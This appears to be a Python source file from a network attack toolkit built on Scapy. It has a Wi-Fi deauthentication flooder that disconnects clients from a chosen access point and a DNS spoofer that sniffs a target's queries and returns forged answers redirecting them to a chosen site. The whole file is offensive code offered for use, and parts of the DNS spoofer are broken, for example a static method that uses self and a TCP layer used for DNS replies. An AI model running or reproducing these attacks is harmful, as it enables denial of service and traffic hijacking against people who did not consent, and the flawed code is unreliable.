from scapy.all import *
from lib.colors import *
import logging
import sys, socket

logging.basicConfig(level=logging.DEBUG, format="[{0}%(levelname)s{1}][{2}%(asctime)s{1}]{3}%(message)s{1}".format(LGREEN, RST, BLUE, RD), datefmt="%H:%M:%S")
conf.verb = 0

class deauth_attack:

    def __init__(self, iface, BSSID, channel):
        self.iface = iface
        self.BSSID = BSSID
        self.channel = channel
        self.broadcast = "ff:ff:ff:ff:ff:ff"
        self.packet = Dot11(addr1=self.broadcast, addr2=self.BSSID, addr3=self.BSSID)/Dot11Deauth()

    def deauth(self):
        logging.info(" Sending deauth packets to {} ".format(self.BSSID))
        count = 0
        while True:
            try:
                sys.stdout.write("\r[{1}{2}{0}] {3}Deauth packets sent{0} (Press CTRL+C to cancel)".format(RST, LRED, count, RD))
                sys.stdout.flush()
                sendp(self.packet, iface=self.iface, count=1)
                count += 1
            except KeyboardInterrupt:
                print("\n")
                logging.info(" Exiting...")
                sys.exit(0)

class DNSspoof(object):

    conf.verb = 0

    def __init__(self, target, website, interface):
        self._target = target
        self._interface = interface
        self._website = website
        self._active = True

    def __str__(self):
        print("DNS Spoofing on target {} and redirecting traffic to {}".format(self._target, self._website))

    @property
    def website(self):
        return self._website

    @website.setter
    def gethost(self, website):
        try:
            webIP = socket.gethostbyname(website)
            self._website = webIP
        except:
            try:
                webname = socket.gethostbyaddr(website)
                self._website = website
            except Exception as e:
                print(str(e))
                sys.exit(1)

    def stop(self):
        self._active = False

    def craft_packet(self, pkt):
        IPlayer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        TCPlayer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport)
        DNSlayer = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, qr=1, aa=1, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self._website))
        return IPlayer/TCPlayer/DNSlayer

    @staticmethod
    def send_packet(pkt):
        if pkt.haslayer(DNSQR):
            spoofed_packet = self.craft_packet(pkt)
            send(spoofed_packet)
            
    def sniffer(self):
        while self._active:
            try:
                sniff(filter='udp port 53 and host {}'.format(self._target), iface=self._interface, store=0, prn=send_packet, count=1)
            except KeyboardInterrupt:
                self.stop()
        
    
